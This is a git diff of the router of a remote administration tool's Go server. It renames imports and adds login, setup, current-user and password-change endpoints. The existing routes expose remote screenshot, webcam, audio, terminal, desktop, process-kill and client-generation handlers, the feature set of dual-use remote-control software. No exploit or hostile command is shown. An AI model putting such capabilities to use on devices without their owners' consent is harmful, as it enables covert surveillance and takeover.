@@ -1,19 +1,20 @@
 package handler
 
 import (
-	"Spark/server/handler/audio"
-	"Spark/server/handler/bridge"
-	"Spark/server/handler/desktop"
-	"Spark/server/handler/file"
-	"Spark/server/handler/generate"
-	"Spark/server/handler/longpoll"
-	"Spark/server/handler/process"
-	"Spark/server/handler/screenshot"
-	"Spark/server/handler/share"
-	"Spark/server/handler/terminal"
-	"Spark/server/handler/utility"
-	"Spark/server/handler/webcam"
-	"Spark/server/handler/webrtc"
+	"Rocket/server/handler/audio"
+	authHandler "Rocket/server/handler/auth"
+	"Rocket/server/handler/bridge"
+	"Rocket/server/handler/desktop"
+	"Rocket/server/handler/file"
+	"Rocket/server/handler/generate"
+	"Rocket/server/handler/longpoll"
+	"Rocket/server/handler/process"
+	"Rocket/server/handler/screenshot"
+	"Rocket/server/handler/share"
+	"Rocket/server/handler/terminal"
+	"Rocket/server/handler/utility"
+	"Rocket/server/handler/webcam"
+	"Rocket/server/handler/webrtc"
 	"github.com/gin-gonic/gin"
 )
 
@@ -21,6 +22,12 @@ var AuthHandler gin.HandlerFunc
 
 // InitRouter will initialize http and websocket routers.
 func InitRouter(ctx *gin.RouterGroup) {
+	// Public authentication endpoints (no auth required)
+	ctx.POST(`/auth/login`, authHandler.Login)
+	ctx.POST(`/auth/logout`, authHandler.Logout)
+	ctx.GET(`/auth/setup/check`, authHandler.CheckSetup)
+	ctx.POST(`/auth/setup`, authHandler.InitialSetup)
+
 	ctx.Any(`/bridge/push`, bridge.BridgePush)
 	ctx.Any(`/bridge/pull`, bridge.BridgePull)
 	ctx.Any(`/client/update`, utility.CheckUpdate) // Client, for update.
@@ -32,6 +39,10 @@ func InitRouter(ctx *gin.RouterGroup) {
 
 	group := ctx.Group(`/`, AuthHandler)
 	{
+		// User management endpoints (auth required)
+		group.GET(`/auth/user`, authHandler.GetCurrentUser)
+		group.POST(`/auth/password/change`, authHandler.ChangePassword)
+
 		group.POST(`/device/screenshot/get`, screenshot.GetScreenshot)
 		group.POST(`/device/process/list`, process.ListDeviceProcesses)
 		group.POST(`/device/process/kill`, process.KillDeviceProcess)
